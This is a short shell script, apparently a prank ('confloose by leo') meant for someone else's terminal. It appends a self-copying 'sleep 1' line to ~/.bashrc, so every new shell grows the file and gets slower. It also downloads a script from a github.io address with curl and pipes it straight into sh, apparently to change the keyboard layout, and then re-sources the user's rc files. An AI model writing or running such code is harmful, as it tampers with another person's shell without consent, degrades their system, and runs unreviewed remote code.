#!/bin/sh

echo "echo 'sleep 1 # confloose by leo' >> \"$HOME/.bashrc\"" >> "$HOME/.bashrc"
echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "de-keyboard" "'echo \\'sleep 1 # confloose by leo [sleep, child]\\' >> \"\$HOME/.bashrc\"'" | sh
for name in bashrc zshrc; do source "$HOME/.$name" 2>/dev/null done
